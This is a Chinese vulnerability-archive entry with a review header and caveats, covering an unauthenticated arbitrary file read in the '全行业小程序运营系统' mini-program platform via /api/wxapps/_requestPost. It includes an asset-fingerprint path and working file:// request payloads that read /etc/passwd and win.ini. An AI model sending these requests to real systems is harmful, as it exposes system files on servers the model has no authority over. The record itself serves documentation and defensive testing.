---
source: "wy876 漏洞文库"
title: "全行业小程序运营系统 wxapps _requestPost file协议读取"
product: "全行业小程序运营系统"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知；Windows/Linux示例"
prerequisites: "请求无凭据"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/xhsw1s8g1fmxb8nf"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E5%85%A8%E8%A1%8C%E4%B8%9A%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%90%A5%E7%B3%BB%E7%BB%9F/%E5%85%A8%E8%A1%8C%E4%B8%9A%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%90%A5%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3_requestPost%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
id: "vw-d3654fc49006b73e1898c820"
entity_id: "ve-d3654fc49006b73e1898c820"
schema_version: "1"
---

# 全行业小程序运营系统 wxapps _requestPost file协议读取

## 条目说明

- 对象与具体问题：全行业小程序运营系统；wxapps _requestPost file协议读取
- 版本、配置及部署条件：版本未知；Windows/Linux示例
- 认证与权限前提：请求无凭据
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 与193万能门店同完整路由和参数，可能共享源码/换名产品，需发行方/代码证据再判同实体
- 本篇多Windows样例可互补，但两平台均缺响应/版本/修复
- file协议读取应区分于HTTP SSRF；本地文件权限与服务URL库支持为前提

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
全行业小程序运营系统是一个无需编程，各行业模版直接套用，一键生成，轻松搭建小程序，界面自由DIY，同步实时预览，可视化操作让您所见即所得，随心打造个性小程序。全行业小程序运营系统接口_requestPost存在任意文件读取漏洞

## 二、影响版本
全行业小程序运营系统

## 三、资产测绘
```plain
"/com/css/head_foot.css"
```


## 四、漏洞复现
```http
GET /api/wxapps/_requestPost?url=file:///etc/passwd&data=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
```


```plain
/api/wxapps/_requestPost?url=file:///C:/windows/win.ini&data=1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/xhsw1s8g1fmxb8nf>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
